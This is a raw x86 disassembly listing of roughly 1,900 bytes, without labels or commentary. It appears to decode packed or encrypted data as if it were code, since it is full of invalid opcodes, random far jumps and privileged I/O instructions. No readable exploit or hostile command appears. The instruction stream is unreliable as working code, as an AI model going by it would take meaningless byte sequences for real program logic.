  40acf7:	sub    eax,0x9ef78692
  40acfc:	sar    BYTE PTR [edi-0x51677543],1
  40ad02:	xchg   esi,eax
  40ad03:	jo     0x40ad84
  40ad05:	stc    
  40ad06:	les    esp,FWORD PTR [esi+ebp*8-0x16]
  40ad0a:	mov    edi,0x7ed4138d
  40ad0f:	outs   dx,BYTE PTR ds:[esi]
  40ad10:	cmc    
  40ad11:	lods   eax,DWORD PTR ds:[esi]
  40ad12:	add    esp,ecx
  40ad14:	iret   
  40ad15:	(bad)  
  40ad16:	stos   BYTE PTR es:[edi],al
  40ad17:	push   esp
  40ad18:	mov    ds:0x88ca5c30,al
  40ad1d:	xchg   esi,eax
  40ad1e:	stc    
  40ad1f:	xor    al,0x4b
  40ad21:	clc    
  40ad22:	xchg   edx,eax
  40ad23:	daa    
  40ad24:	enter  0x513a,0x92
  40ad28:	adc    dh,BYTE PTR [ecx+edi*1-0x7c656a1d]
  40ad2f:	dec    ecx
  40ad30:	out    0xeb,al
  40ad32:	mov    dh,0x58
  40ad34:	xlat   BYTE PTR ds:[ebx]
  40ad35:	cmp    BYTE PTR [edx-0x5eaa04e2],ch
  40ad3b:	xchg   ax,ax
  40ad3d:	jae    0x40ad9d
  40ad3f:	call   0x56e5442a
  40ad44:	not    edx
  40ad46:	push   esi
  40ad47:	jo     0x40adbe
  40ad49:	push   ecx
  40ad4a:	pop    edx
  40ad4b:	mov    esp,ebp
  40ad4d:	adc    dl,BYTE PTR [edx]
  40ad4f:	clc    
  40ad50:	sub    DWORD PTR ds:0x134e698f,esp
  40ad56:	test   DWORD PTR [edx],0x11d0e22f
  40ad5c:	jge    0x40ad28
  40ad5e:	cmc    
  40ad5f:	cmp    bh,dh
  40ad61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad62:	jae    0x40adc7
  40ad64:	not    DWORD PTR [ebx]
  40ad66:	xchg   esp,eax
  40ad67:	add    al,0xcb
  40ad69:	fcmovb st,st(5)
  40ad6b:	inc    ebp
  40ad6c:	xchg   BYTE PTR [ebx+eax*8-0x64],bh
  40ad70:	jmp    0x1c4c:0x82224ff4
  40ad77:	or     ecx,0x8157b356
  40ad7d:	sub    ecx,DWORD PTR [esi]
  40ad7f:	xchg   esi,eax
  40ad80:	pushf  
  40ad81:	jmp    0x7f271c85
  40ad86:	fisttp WORD PTR [esi+0x1e]
  40ad89:	jp     0x40ad54
  40ad8b:	sbb    cl,BYTE PTR [edx-0x59fcf6c0]
  40ad91:	clc    
  40ad92:	jg     0x40ae00
  40ad94:	test   eax,0xbb5986d
  40ad99:	mov    ah,0x90
  40ad9b:	mov    edi,DWORD PTR [ebp-0x8bd038f]
  40ada1:	mov    edi,0xbef1350c
  40ada6:	xor    ch,BYTE PTR [edi+0x55]
  40ada9:	or     edi,ebp
  40adab:	mov    bh,cl
  40adad:	mul    dl
  40adaf:	jmp    0x40ad47
  40adb1:	cmp    ah,BYTE PTR [ecx-0xa73336e]
  40adb7:	push   ebx
  40adb8:	pop    esi
  40adb9:	lods   eax,DWORD PTR ds:[esi]
  40adba:	mov    al,0xcd
  40adbc:	mov    ds:0x1c1e003,al
  40adc1:	js     0x40ae30
  40adc3:	jns    0x40ad6a
  40adc5:	mov    ebx,0xb427b060
  40adca:	sahf   
  40adcb:	iret   
  40adcc:	add    al,0xc2
  40adce:	inc    edx
  40adcf:	out    dx,eax
  40add0:	mov    ecx,0x7cbdd8b3
  40add5:	lock jae 0x40ad82
  40add8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40add9:	xor    ebx,DWORD PTR [ebx-0x5a92917f]
  40addf:	movups xmm7,xmm2
  40ade2:	ins    BYTE PTR es:[edi],dx
  40ade3:	inc    ebp
  40ade4:	loopne 0x40ae24
  40ade6:	cmp    eax,0x34955829
  40adeb:	push   esi
  40adec:	adc    al,0x9f
  40adee:	icebp  
  40adef:	mov    ebx,0xb30cbd29
  40adf4:	adc    al,BYTE PTR [eax-0x2d]
  40adf7:	fbstp  TBYTE PTR [edx+esi*8-0x7864398d]
  40adfe:	push   ss
  40adff:	and    al,0x50
  40ae01:	mov    DWORD PTR [ebx],0x4ae90c25
  40ae07:	les    esi,FWORD PTR [edi]
  40ae09:	pop    es
  40ae0a:	mov    ebp,0xfaabb7d
  40ae0f:	retf   
  40ae10:	and    al,0x86
  40ae12:	test   eax,0x957e519e
  40ae17:	pop    eax
  40ae18:	jbe    0x40ada9
  40ae1a:	sbb    eax,0xff8d0e27
  40ae1f:	or     esi,DWORD PTR [eax+0x4f]
  40ae22:	lahf   
  40ae23:	sbb    eax,0xa76cb0ed
  40ae28:	sub    eax,DWORD PTR [edi]
  40ae2a:	call   FWORD PTR [edx-0x79]
  40ae2d:	iret   
  40ae2e:	call   0x9350:0x8dfcbb62
  40ae35:	outs   dx,DWORD PTR ds:[esi]
  40ae36:	lods   eax,DWORD PTR ds:[esi]
  40ae37:	not    BYTE PTR [eax]
  40ae39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae3a:	sbb    cl,BYTE PTR [eax+0x78]
  40ae3d:	cld    
  40ae3e:	xchg   esi,ecx
  40ae40:	and    eax,ecx
  40ae42:	shl    DWORD PTR [ecx+eax*8-0x63],cl
  40ae46:	popa   
  40ae47:	mov    eax,ds:0x65ad989d
  40ae4c:	repnz mov ah,0xeb
  40ae4f:	mov    esp,0x6b6b0b3
  40ae54:	adc    esi,DWORD PTR [edi+eiz*8]
  40ae57:	popa   
  40ae58:	ds (bad) 
  40ae5a:	or     eax,0xbc5dfda0
  40ae5f:	xor    eax,0x26da16
  40ae64:	inc    esp
  40ae65:	das    
  40ae66:	cdq    
  40ae67:	pushf  
  40ae68:	mov    ebx,0x65b287af
  40ae6d:	out    0xe2,eax
  40ae6f:	lods   al,BYTE PTR ds:[esi]
  40ae70:	ja     0x40adf7
  40ae72:	ret    
  40ae73:	mov    eax,ds:0x84134441
  40ae78:	add    esi,DWORD PTR [ebp-0x10]
  40ae7b:	imul   edi,DWORD PTR [ebp-0x27941e9b],0x9
  40ae82:	cmp    ecx,edi
  40ae84:	xchg   ecx,eax
  40ae85:	lock std 
  40ae87:	ja     0x40ae38
  40ae89:	push   ds
  40ae8a:	ds push ss
  40ae8c:	call   FWORD PTR [ebx-0x1a3c8066]
  40ae92:	aaa    
  40ae93:	ss (bad) 
  40ae95:	push   edi
  40ae96:	push   ebx
  40ae97:	cmp    al,0x3d
  40ae99:	xchg   esi,eax
  40ae9a:	cmp    bh,BYTE PTR [edi-0x4e68d368]
  40aea0:	bound  esi,QWORD PTR [eax-0x1]
  40aea3:	sub    edx,edi
  40aea5:	mov    bl,BYTE PTR [ecx+0x790da129]
  40aeab:	cs sahf 
  40aead:	inc    DWORD PTR [edx]
  40aeaf:	call   0xa0fe41d8
  40aeb4:	sar    DWORD PTR [edi+esi*1],0x55
  40aeb8:	xchg   edx,eax
  40aeb9:	pop    eax
  40aeba:	sub    BYTE PTR [ebx],dh
  40aebc:	outs   dx,BYTE PTR ds:[esi]
  40aebd:	mov    ebp,0xfa5a723d
  40aec2:	loope  0x40ae75
  40aec4:	jbe    0x40ae75
  40aec6:	pop    es
  40aec7:	or     al,0xa9
  40aec9:	jb     0x40af48
  40aecb:	fs ins DWORD PTR es:[edi],dx
  40aecd:	out    dx,eax
  40aece:	lods   al,BYTE PTR ds:[esi]
  40aecf:	inc    ecx
  40aed0:	sahf   
  40aed1:	jmp    0xa9a9:0xbc919ca9
  40aed8:	lahf   
  40aed9:	pushf  
  40aeda:	retf   
  40aedb:	dec    BYTE PTR [edx+0xa83947b]
  40aee1:	aas    
  40aee2:	nop
  40aee3:	aad    0x7d
  40aee5:	push   0x61
  40aee7:	mov    DWORD PTR [eax+0x70ff4afa],0xb6fc7287
  40aef1:	inc    edx
  40aef2:	inc    edi
  40aef3:	(bad)  [eax]
  40aef5:	add    eax,0x43
  40aef8:	int3   
  40aef9:	push   esp
  40aefa:	sbb    al,0xc4
  40aefc:	les    esi,FWORD PTR ds:0xd9cae572
  40af02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af03:	inc    esp
  40af04:	shl    BYTE PTR es:[edi-0x5940855f],0xbc
  40af0c:	jl     0x40ae90
  40af0e:	es inc edx
  40af10:	loopne 0x40af4b
  40af12:	mov    ?,WORD PTR [ebx]
  40af14:	scas   eax,DWORD PTR es:[edi]
  40af15:	ficom  DWORD PTR [edi+0x3d]
  40af18:	adc    cl,BYTE PTR [edi-0x4]
  40af1b:	xchg   edi,eax
  40af1c:	in     al,dx
  40af1d:	sbb    dh,BYTE PTR [esi+0xa1e70f9]
  40af23:	xor    ch,cl
  40af25:	xor    edi,DWORD PTR es:[edi+0x7517c082]
  40af2c:	cld    
  40af2d:	jge    0x40af55
  40af2f:	jge    0x40af95
  40af31:	xchg   edi,eax
  40af32:	mov    ah,0x4e
  40af34:	jecxz  0x40af50
  40af36:	jae    0x40aed8
  40af38:	ror    esp,0xe3
  40af3b:	sbb    al,0xb3
  40af3d:	scas   al,BYTE PTR es:[edi]
  40af3e:	mov    bh,dl
  40af40:	or     BYTE PTR [esi-0x7f],ah
  40af43:	es push 0x1d408677
  40af49:	ret    
  40af4a:	pop    edi
  40af4b:	mov    ds:0xd2cd21ea,eax
  40af50:	sub    ah,al
  40af52:	mov    al,ds:0x3bd8e092
  40af57:	mov    DWORD PTR [edi-0xd],ebx
  40af5a:	pusha  
  40af5b:	dec    ebp
  40af5c:	push   es
  40af5d:	push   edx
  40af5e:	mov    esp,DWORD PTR [edi+edx*4]
  40af61:	mov    esi,esp
  40af63:	not    DWORD PTR [edx]
  40af65:	sub    al,0x26
  40af67:	push   esp
  40af68:	fwait
  40af69:	das    
  40af6a:	fist   DWORD PTR [edx+0x7a58a12b]
  40af70:	(bad)  
  40af71:	and    eax,0x6d6eeb8d
  40af76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af77:	mov    cl,0xa7
  40af79:	dec    esp
  40af7a:	repnz das 
  40af7c:	nop
  40af7d:	push   esi
  40af7e:	ss das 
  40af80:	xchg   DWORD PTR [edi-0x26],esp
  40af83:	jg     0x40af83
  40af85:	hlt    
  40af86:	pushf  
  40af87:	mov    ds:0x4843373d,eax
  40af8c:	mov    esi,0x3743fc58
  40af91:	sbb    DWORD PTR ds:0x4f93369c,0x58db245f
  40af9b:	fnstsw WORD PTR [esi]
  40af9d:	sub    ebp,ebx
  40af9f:	mov    ecx,esi
  40afa1:	repnz sti 
  40afa3:	push   esp
  40afa4:	jo     0x40afd2
  40afa6:	sub    eax,0x963134b4
  40afab:	mov    eax,0x4255c57d
  40afb0:	sbb    esp,DWORD PTR [esi-0x36a06327]
  40afb6:	push   ss
  40afb7:	xor    eax,0x6e5d2366
  40afbc:	div    BYTE PTR [ebx+ebx*2-0x7e]
  40afc0:	mov    edi,0x9d222bb0
  40afc5:	lods   eax,DWORD PTR ds:[esi]
  40afc6:	pop    eax
  40afc7:	fldenv [esi+0x7d6fee3]
  40afcd:	mov    eax,0x5ef16db5
  40afd2:	(bad)  
  40afd3:	cmp    bh,dl
  40afd5:	call   0xbdc6:0xa0539e7b
  40afdc:	nop
  40afdd:	(bad)  
  40afde:	mov    al,ds:0xd98651c5
  40afe3:	inc    ebx
  40afe4:	fdivr  st,st(3)
  40afe6:	mov    al,0x53
  40afe8:	cld    
  40afe9:	mov    ch,0xbd
  40afeb:	jae    0x40afa0
  40afed:	stos   BYTE PTR es:[edi],al
  40afee:	out    dx,al
  40afef:	(bad)  
  40aff1:	pop    ds
  40aff2:	std    
  40aff3:	add    ebx,esp
  40aff5:	add    bh,dl
  40aff7:	std    
  40aff8:	into   
  40aff9:	xchg   esp,eax
  40affa:	mov    DWORD PTR [edi],edi
  40affc:	fs pop esi
  40affe:	inc    ecx
  40afff:	fidiv  DWORD PTR [ebx+edx*1]
  40b002:	lock aas 
  40b004:	repnz cmp cl,BYTE PTR [ebp+0x664bdc11]
  40b00b:	bound  ebp,QWORD PTR [ebx+0x6f51ff8b]
  40b011:	mov    edx,0x94ccc740
  40b016:	or     al,0x65
  40b018:	jmp    0x40afc6
  40b01a:	cmp    eax,0x369cc9f8
  40b01f:	jb     0x40afed
  40b021:	imul   edx,DWORD PTR [edi+esi*8-0x55],0xffffff93
  40b026:	pop    ebx
  40b027:	icebp  
  40b028:	test   eax,0xaa531a18
  40b02d:	sbb    ah,cl
  40b02f:	bound  ecx,QWORD PTR [ebx+0xc]
  40b032:	sbb    cl,bl
  40b034:	arpl   WORD PTR [edx],sp
  40b036:	jg     0x40b063
  40b038:	loop   0x40b0b0
  40b03a:	dec    esi
  40b03b:	test   al,0x5f
  40b03d:	and    eax,0x371ea52a
  40b042:	in     eax,dx
  40b043:	jmp    0xcfe7:0xe5330bc3
  40b04a:	cmp    dh,dh
  40b04c:	nop
  40b04d:	push   esi
  40b04e:	(bad)  
  40b04f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b050:	loopne 0x40b099
  40b052:	pop    ds
  40b053:	push   edx
  40b054:	sub    dl,BYTE PTR [edx]
  40b056:	imul   edi,DWORD PTR [ebx-0x52],0x94cfc98f
  40b05d:	push   esi
  40b05e:	cld    
  40b05f:	pop    edi
  40b061:	(bad)  
  40b062:	div    BYTE PTR [ecx-0x74]
  40b065:	mov    ebx,0x56c3fa6a
  40b06a:	lods   eax,DWORD PTR ds:[esi]
  40b06b:	jmp    0x94edebca
  40b070:	fist   WORD PTR [ebx-0x5e]
  40b073:	mov    bl,0x8c
  40b075:	(bad)
  40b07c:	retf   0x2e0b
  40b07f:	jmp    0x40b082
  40b081:	arpl   dx,di
  40b083:	cmp    DWORD PTR [edx],eax
  40b085:	stos   DWORD PTR es:[edi],eax
  40b086:	aad    0x39
  40b088:	loopne 0x40b0b9
  40b08a:	dec    esp
  40b08b:	into   
  40b08c:	fdiv   QWORD PTR [esi+0x1492ef5a]
  40b092:	pop    esp
  40b093:	scas   al,BYTE PTR es:[edi]
  40b094:	xchg   edx,eax
  40b095:	bound  ebx,QWORD PTR [eax+0x2424c5cf]
  40b09b:	add    bl,0x1f
  40b09e:	nop
  40b09f:	aaa    
  40b0a0:	sbb    dl,cl
  40b0a2:	pop    es
  40b0a3:	push   es
  40b0a4:	mov    dl,0x42
  40b0a6:	jne    0x40b0a8
  40b0a8:	mov    esi,0x43bed1e
  40b0ad:	pop    es
  40b0ae:	and    eax,0x4c2d3a5f
  40b0b3:	mov    esi,0x2a2c6f45
  40b0b8:	(bad)  
  40b0b9:	test   al,0xf5
  40b0bb:	mov    DWORD PTR [ebp-0x15],ebp
  40b0be:	and    esi,ebx
  40b0c0:	dec    edx
  40b0c1:	push   edi
  40b0c2:	push   ecx
  40b0c3:	mov    al,ds:0x9424bf74
  40b0c8:	in     eax,0x92
  40b0ca:	mov    eax,0xf49bea47
  40b0cf:	int    0x42
  40b0d1:	xchg   esp,eax
  40b0d2:	fcom   DWORD PTR [ecx]
  40b0d4:	adc    eax,0xedfe1036
  40b0d9:	cdq    
  40b0da:	jmp    0xd10d9c75
  40b0df:	pop    DWORD PTR [ecx+0x42b82a5]
  40b0e5:	ss fwait
  40b0e7:	cld    
  40b0e8:	or     al,0x50
  40b0ea:	sbb    ebp,DWORD PTR [ebx-0x61]
  40b0ed:	xor    al,0x41
  40b0ef:	xor    al,0x6c
  40b0f1:	sbb    eax,0x456d2624
  40b0f6:	mov    eax,ds:0x671a29e5
  40b0fb:	sbb    DWORD PTR [esi+0xddd0d2d],ebp
  40b101:	or     al,0x35
  40b104:	imul   ebp,ebx,0xffffffec
  40b107:	sbb    bl,BYTE PTR [esi]
  40b109:	rol    BYTE PTR [esi-0x3f],cl
  40b10c:	(bad)  
  40b10d:	mov    ah,0xab
  40b10f:	inc    ebx
  40b110:	adc    al,0xc7
  40b112:	xor    DWORD PTR [ecx],edx
  40b114:	out    dx,al
  40b115:	(bad)  
  40b116:	sub    esp,DWORD PTR [edx+0x12]
  40b119:	jl     0x40b0ff
  40b11b:	sbb    eax,DWORD PTR [esp+edx*2-0x702fc914]
  40b122:	jge    0x40b110
  40b124:	pushf  
  40b125:	fdivrp st(3),st
  40b127:	jnp    0x40b129
  40b129:	sub    bh,ah
  40b12b:	sub    eax,0x5c4ec5b6
  40b130:	imul   ebx,ebx,0x7711a523
  40b136:	pusha  
  40b137:	retf   0xdb2b
  40b13a:	inc    ebx
  40b13b:	aas    
  40b13c:	(bad)  
  40b13d:	mov    esi,0x6aa6940b
  40b142:	imul   edi,DWORD PTR ds:0xac41adfb,0xfffffff2
  40b149:	mov    edx,0xf0c91c8c
  40b14e:	jg     0x40b142
  40b150:	mov    ss,WORD PTR [ebp-0x4c]
  40b153:	jnp    0x40b121
  40b155:	push   edi
  40b156:	aaa    
  40b157:	(bad)  
  40b158:	mov    ecx,0xf37bc3b9
  40b15d:	pop    esp
  40b15e:	sar    eax,1
  40b160:	add    DWORD PTR [edx-0x7cc814d9],esi
  40b166:	add    esp,DWORD PTR [ebx+0x2e2bf8cf]
  40b16c:	jmp    0x40b1d2
  40b16e:	outs   dx,DWORD PTR ds:[esi]
  40b16f:	daa    
  40b170:	js     0x40b19c
  40b172:	cmc    
  40b173:	mov    DWORD PTR [ecx+0x7d23c656],edi
  40b179:	lods   eax,DWORD PTR ds:[esi]
  40b17a:	or     al,dl
  40b17c:	in     al,dx
  40b17d:	mov    bh,0x97
  40b17f:	sbb    edi,DWORD PTR [ebp+0x6ef19853]
  40b185:	xor    eax,0xcafc2c7d
  40b18a:	les    ebp,FWORD PTR [esi-0x20]
  40b18d:	mov    ?,WORD PTR [ebp-0x74]
  40b190:	out    dx,al
  40b191:	outs   dx,BYTE PTR ds:[esi]
  40b192:	sar    DWORD PTR [eax-0x7b],cl
  40b195:	dec    edx
  40b196:	cmp    BYTE PTR [edi+esi*8-0x80],0x2b
  40b19b:	daa    
  40b19c:	(bad)  
  40b19d:	icebp  
  40b19e:	arpl   WORD PTR ds:0xff3a72a2,si
  40b1a4:	ins    BYTE PTR es:[edi],dx
  40b1a5:	dec    eax
  40b1a6:	dec    BYTE PTR [esi-0x7830fac2]
  40b1ac:	test   al,0x90
  40b1ae:	daa    
  40b1af:	xor    eax,eax
  40b1b1:	push   ecx
  40b1b2:	into   
  40b1b3:	popa   
  40b1b4:	inc    edi
  40b1b5:	cdq    
  40b1b6:	sbb    eax,0x97295453
  40b1bb:	shl    BYTE PTR [ebp+0x1a],0xf1
  40b1bf:	dec    BYTE PTR [esp+ebp*2]
  40b1c2:	jae    0x40b17e
  40b1c4:	dec    eax
  40b1c5:	int3   
  40b1c6:	add    DWORD PTR [edi-0x45],edi
  40b1c9:	sti    
  40b1ca:	cli    
  40b1cb:	aam    0x54
  40b1cd:	int    0x1e
  40b1cf:	add    DWORD PTR [ebx+0x54ce87c3],ecx
  40b1d5:	fadd   QWORD PTR [ecx]
  40b1d7:	xchg   ecx,eax
  40b1d8:	cwde   
  40b1d9:	mov    ds:0xebee54ff,al
  40b1de:	cmp    ecx,DWORD PTR [edx+0x52fccc7f]
  40b1e4:	jg     0x40b16a
  40b1e6:	adc    BYTE PTR [ebx+ebx*2-0x3],cl
  40b1ea:	test   al,0xe
  40b1ec:	scas   al,BYTE PTR es:[edi]
  40b1ed:	ins    DWORD PTR es:[edi],dx
  40b1ee:	mov    esp,0x20353f23
  40b1f3:	xor    al,0x4
  40b1f5:	mov    ebx,0x5c4c072d
  40b1fa:	dec    ecx
  40b1fb:	mov    dh,0xc1
  40b1fd:	cld    
  40b1fe:	mov    cl,0x54
  40b200:	retf   0x9a6f
  40b203:	or     dl,al
  40b205:	dec    esp
  40b206:	loop   0x40b223
  40b208:	jg     0x40b22a
  40b20a:	xchg   ebx,eax
  40b20b:	sub    BYTE PTR [edx-0x2f228522],al
  40b211:	mov    DWORD PTR [edi-0x5d],ebp
  40b214:	cmp    al,0xcf
  40b216:	test   al,0x3f
  40b218:	dec    ecx
  40b219:	xchg   BYTE PTR [eax+0x7f],al
  40b21c:	sbb    BYTE PTR [edx-0x4ff71dae],0xfe
  40b223:	mov    WORD PTR [ecx+edi*2-0x32],gs
  40b227:	inc    esp
  40b228:	ror    bh,cl
  40b22a:	bound  eax,QWORD PTR [edi+0x2e]
  40b22d:	mov    ?,WORD PTR [eax+0x6d061457]
  40b233:	out    dx,eax
  40b234:	inc    ebp
  40b235:	pop    ebp
  40b236:	aas    
  40b237:	(bad)  
  40b238:	lock push edx
  40b23a:	mov    esp,0x58b05cfe
  40b23f:	retf   
  40b240:	xor    esp,DWORD PTR [esi+esi*8-0x2a]
  40b244:	call   0x6297:0x6c516229
  40b24b:	clc    
  40b24c:	xor    DWORD PTR [edx],ecx
  40b24e:	das    
  40b24f:	jno    0x40b1f5
  40b251:	pop    edi
  40b252:	das    
  40b253:	xchg   esi,ebx
  40b255:	inc    edi
  40b256:	xchg   ebp,eax
  40b257:	cmp    al,0x5b
  40b259:	pop    edx
  40b25a:	shr    al,0x2d
  40b25d:	dec    edi
  40b25e:	lods   eax,DWORD PTR ds:[esi]
  40b25f:	dec    eax
  40b260:	pop    es
  40b261:	push   ss
  40b262:	mov    esp,0x98fc2ebf
  40b267:	mov    ah,0xda
  40b269:	inc    esp
  40b26a:	push   eax
  40b26b:	jecxz  0x40b284
  40b26d:	lods   al,BYTE PTR ds:[esi]
  40b26e:	dec    edi
  40b26f:	loopne 0x40b267
  40b271:	or     BYTE PTR ds:0xe65df357,dh
  40b277:	imul   ebx,DWORD PTR [edi],0xffffffb1
  40b27a:	lods   al,BYTE PTR ds:[esi]
  40b27b:	sub    BYTE PTR [ecx+0x12],dl
  40b27e:	dec    esp
  40b27f:	das    
  40b280:	ss bswap ebp
  40b283:	inc    ebp
  40b284:	mov    esi,0x7da4343b
  40b289:	cmp    edx,edx
  40b28b:	push   edi
  40b28c:	xchg   ebp,eax
  40b28d:	iret   
  40b28e:	mov    ah,0x45
  40b290:	push   ebx
  40b291:	ja     0x40b21b
  40b293:	xchg   esi,eax
  40b294:	jmp    0x263:0x70fbd053
  40b29b:	mov    ds:0xcd1ae1a,eax
  40b2a0:	lds    edi,FWORD PTR [edx+ecx*2-0x41674ff9]
  40b2a7:	fcomp  st(3)
  40b2a9:	fninit 
  40b2ab:	cld    
  40b2ac:	mov    bh,0xea
  40b2ae:	dec    edi
  40b2af:	push   esp
  40b2b0:	cmp    DWORD PTR [ebp+0x732e1e22],edx
  40b2b6:	aas    
  40b2b7:	cmp    BYTE PTR [ebp-0x7d83d603],0x67
  40b2be:	ss mov edx,0x1d00247f
  40b2c4:	leave  
  40b2c5:	add    eax,0x792be903
  40b2ca:	lods   al,BYTE PTR ds:[esi]
  40b2cb:	(bad)  
  40b2cc:	dec    ebx
  40b2cd:	test   eax,0xf97a590a
  40b2d2:	sub    DWORD PTR [edx+0x4b7454d6],edx
  40b2d8:	scas   eax,DWORD PTR es:[edi]
  40b2d9:	stos   BYTE PTR es:[edi],al
  40b2da:	mov    ds:0xf80d30e8,eax
  40b2df:	xlat   BYTE PTR ds:[ebx]
  40b2e0:	lahf   
  40b2e1:	cmp    eax,DWORD PTR [edx-0x48]
  40b2e4:	dec    ecx
  40b2e5:	jl     0x40b292
  40b2e7:	inc    esi
  40b2e8:	and    dl,BYTE PTR [ebp+ebx*8+0x25]
  40b2ec:	inc    ebp
  40b2ed:	pop    ebx
  40b2ee:	xchg   BYTE PTR [ebp-0x4f],bh
  40b2f1:	dec    ebx
  40b2f2:	leave  
  40b2f3:	xlat   BYTE PTR ds:[ebx]
  40b2f4:	rcr    ebx,1
  40b2f6:	pop    ecx
  40b2f7:	xchg   BYTE PTR [eax+0x7b],bh
  40b2fa:	(bad)  
  40b2fb:	call   0xf64b:0xc99f591b
  40b302:	rcl    DWORD PTR [esi+0x79e90a3c],1
  40b308:	mov    dl,BYTE PTR [edx-0x3aa6064b]
  40b30e:	out    dx,eax
  40b30f:	mov    BYTE PTR [edi-0x561cd670],bh
  40b315:	ja     0x40b307
  40b317:	outs   dx,BYTE PTR ds:[esi]
  40b318:	das    
  40b319:	pop    ss
  40b31a:	push   esp
  40b31b:	fisttp QWORD PTR [edx-0x69]
  40b31e:	loop   0x40b34b
  40b320:	pop    ds
  40b321:	push   eax
  40b322:	scas   al,BYTE PTR es:[edi]
  40b323:	call   0x397:0x924fb9fb
  40b32a:	adc    ebx,DWORD PTR [esp+ebx*2]
  40b32d:	push   edx
  40b32e:	fcomp  DWORD PTR [eax-0x1e7d2a82]
  40b334:	mov    bl,0xac
  40b336:	cmp    al,0x55
  40b338:	pop    ebp
  40b339:	mov    BYTE PTR [edi],0xa5
  40b33c:	sub    al,0xe
  40b33e:	inc    edi
  40b33f:	cmp    DWORD PTR [ebp-0x42],esi
  40b342:	or     DWORD PTR [edi+eax*4-0x3d],0xd2482170
  40b34a:	aas    
  40b34b:	mov    BYTE PTR [eax],bh
  40b34d:	sbb    dl,BYTE PTR [eax+0x614cc4f6]
  40b353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b354:	push   edx
  40b355:	jle    0x40b2dc
  40b357:	add    dl,ah
  40b359:	ficomp WORD PTR [edx+0x1a]
  40b35c:	or     ecx,ebx
  40b35e:	xchg   BYTE PTR [ecx],al
  40b360:	lods   eax,DWORD PTR ds:[esi]
  40b361:	aaa    
  40b362:	in     eax,dx
  40b363:	in     al,dx
  40b364:	gs sahf 
  40b366:	add    ebx,esp
  40b368:	and    ebp,DWORD PTR [edi-0x46cd1294]
  40b36e:	repnz outs dx,DWORD PTR ds:[esi]
  40b370:	or     dh,cl
  40b372:	push   fs
  40b374:	pop    edx
  40b375:	xor    eax,DWORD PTR [edx+0x444ddf21]
  40b37b:	xchg   edi,eax
  40b37c:	and    BYTE PTR ds:0x2cebe735,al
  40b382:	sbb    eax,0xadadbfb9
  40b387:	loop   0x40b36c
  40b389:	inc    edx
  40b38a:	jns    0x40b32b
  40b38c:	sub    ebp,ecx
  40b38e:	and    edi,esp
  40b390:	(bad)  
  40b391:	or     DWORD PTR [edi-0xe],edi
  40b394:	pop    esp
  40b395:	inc    eax
  40b396:	or     al,0xd9
  40b398:	xor    cl,BYTE PTR [ebx]
  40b39a:	lods   al,BYTE PTR ds:[esi]
  40b39b:	push   edx
  40b39c:	mov    ch,0xd3
  40b39e:	ins    BYTE PTR es:[edi],dx
  40b39f:	(bad)  
  40b3a0:	cdq    
  40b3a1:	in     al,dx
  40b3a2:	retf   
  40b3a3:	sbb    edx,ebp
  40b3a5:	jecxz  0x40b3ec
  40b3a7:	pop    es
  40b3a8:	pushf  
  40b3a9:	shl    dl,0x2
  40b3ac:	pop    esp
  40b3ad:	sub    ch,BYTE PTR [ebx-0x77]
  40b3b0:	mov    ds:0xe2910c70,eax
  40b3b5:	add    BYTE PTR [ebp+0x60],al
  40b3b8:	cmp    BYTE PTR [ebp+0x3bb23fd9],bl
  40b3be:	outs   dx,BYTE PTR ds:[esi]
  40b3bf:	(bad)  [esi]
  40b3c1:	mov    BYTE PTR ds:[eax+0x6d],ah
  40b3c5:	in     al,0xc7
  40b3c7:	pop    ebx
  40b3c8:	gs call 0xaa63:0xeefe2f1f
  40b3d0:	dec    edi
  40b3d1:	dec    eax
  40b3d2:	or     edx,ecx
  40b3d4:	popa   
  40b3d5:	js     0x40b453
  40b3d7:	(bad)  
  40b3d8:	mov    ch,0xe3
  40b3da:	pop    edx
  40b3db:	pop    edx
  40b3dc:	xchg   esi,eax
  40b3dd:	imul   edx,DWORD PTR [ecx-0x2a],0xffffff94
  40b3e1:	repz retf 
  40b3e3:	repz mov ch,BYTE PTR ds:0xbdaf141b
  40b3ea:	xor    ebp,DWORD PTR [esi+ebp*2]
  40b3ed:	dec    ecx
  40b3ee:	daa    
  40b3ef:	pusha  
  40b3f0:	fdivr  QWORD PTR [edx+0x2db94670]
  40b3f6:	xor    DWORD PTR [eax-0x16],esi
  40b3f9:	and    dh,al
  40b3fb:	daa    
  40b3fc:	fist   DWORD PTR ds:0xe990a406
  40b402:	inc    edi
  40b403:	add    edi,edx
  40b405:	cmp    DWORD PTR [ebx],0x84a3928f
  40b40b:	cli    
  40b40c:	in     al,dx
  40b40d:	mov    eax,ds:0x4b1ef6ee
  40b412:	mov    ?,WORD PTR [ecx-0x5]
  40b415:	dec    ebx
  40b416:	jne    0x40b407
  40b418:	popa   
  40b419:	test   BYTE PTR [esi+edx*1],cl
  40b41c:	fs pop ds
  40b41e:	ja     0x40b3f9
  40b420:	icebp  
  40b421:	and    ebp,DWORD PTR [edi]
  40b423:	or     edx,0x8eaffe1f
  40b429:	or     ch,ah
  40b42b:	jne    0x40b405
  40b42d:	loope  0x40b404
  40b42f:	sbb    ecx,esp
  40b431:	clc    
  40b432:	add    BYTE PTR [ecx],cl
  40b434:	xor    DWORD PTR [esi-0x2a],0x7d
  40b438:	jno    0x40b475
  40b43a:	mov    dl,0x66
  40b43c:	std    
  40b43d:	cmp    DWORD PTR [edx+0x47373c48],edi
  40b443:	mov    al,0xe1
  40b445:	inc    ecx
  40b446:	mov    cl,0xc8
  40b448:	sar    DWORD PTR [edx],cl
  40b44a:	mov    cl,0xad
  40b44c:	(bad)  
  40b44e:	add    esp,eax
  40b450:	mov    bh,0x2e
  40b452:	push   edx
  40b453:	out    0x62,al
  40b455:	sbb    eax,0xaf4be070
  40b45a:	(bad)  
  40b45b:	call   0xf64d:0xf122666f
  40b462:	ja     0x40b4d7
  40b464:	sub    BYTE PTR [eax],cl
  40b466:	imul   esp,DWORD PTR [eax],0x4b
  40b469:	sub    DWORD PTR [eax+eax*8],0x762f4663
  40b470:	cmp    eax,0xbb8cc78c
  40b475:	retf   
  40b476:	lock xor cl,BYTE PTR [esi+0x54e1c33f]
